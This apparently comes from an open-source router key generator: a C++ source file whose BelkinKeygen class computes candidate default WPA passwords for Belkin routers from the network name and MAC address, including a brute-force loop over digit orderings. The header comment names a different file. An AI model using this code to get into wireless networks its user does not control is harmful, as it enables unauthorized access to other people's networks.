/*
 * AxtelKeygen.cpp
 *
 *  Created on: 5 de Ago de 2012
 *      Author: ruka
 */

#include "BelkinKeygen.h"
#include <QRegExp>

BelkinKeygen::BelkinKeygen(QString ssid, QString mac) :
		Keygen(ssid, mac) {
    kgname = "Belkin";
}

int BelkinKeygen::getSupportState() const{
    if ( getSsidName().count(QRegExp("^(B|b)elkin(\\.|_)[0-9a-fA-F]{3,6}$")) == 1 )
        return SUPPORTED;
    return UNLIKELY;
}

QString BelkinKeygen::addOneToMac(QString mac) {
    bool ok;
    long macInt = mac.toLong(&ok, 16);
    if (!ok)
        throw ERROR;
    return QString::number(macInt+1, 16);
}

void BelkinKeygen::generateKey(QString mac, QString charset, int order[8]) {
    QString key("");
    if ( mac.length() != 8 )
        throw ERROR;
    for ( int i = 0; i < mac.length(); ++i ){
        QString k = mac.mid(order[i]-1, 1);
        bool ok;
        key += charset.at(k.toInt(&ok, 16));
        if (!ok)
            throw ERROR;
    }
    results.append(key);
}

QVector<QString> & BelkinKeygen::getKeys() {
    QString mac = getMacAddress();
    if ( mac.length() != 12 )
        throw ERROR;
    QString ssid = getSsidName();
    if (ssid.startsWith("Belkin")) {
        generateKey(mac.right(8), CHARSETS[0], (int*)ORDERS[0]);
    } else if (ssid.startsWith("belkin")) {
        mac = addOneToMac(mac);
        generateKey(mac.right(8), CHARSETS[1], (int*)ORDERS[0]);
        if (!mac.startsWith("944452")) {
            generateKey(mac.right(8), CHARSETS[1], (int*)ORDERS[2]);
            generateKey(mac.right(8), CHARSETS[1], (int*)ORDERS[3]);
            mac = addOneToMac(mac);
            generateKey(mac.right(8), CHARSETS[1], (int*)ORDERS[0]);
        }
    } else {
        //Bruteforcing
        for (int i = 0; i < 3; ++i) {
            for ( int j = 0; j < NUMBERS_OF_ORDERS; ++j ) {
                generateKey(mac.right(8), CHARSETS[0], (int*)ORDERS[j]);
                generateKey(mac.right(8), CHARSETS[1], (int*)ORDERS[j]);
            }
            mac = addOneToMac(mac);
        }
    }
	return results;
}


const int BelkinKeygen::ORDERS[NUMBERS_OF_ORDERS][8] = {{6,2,3,8,5,1,7,4},{1,2,3,8,5,1,7,4},{1,2,3,8,5,6,7,4},{6,2,3,8,5,6,7,4}};
const QString BelkinKeygen::CHARSETS[2] = {QString("024613578ACE9BDF"), QString("944626378ace9bdf")};
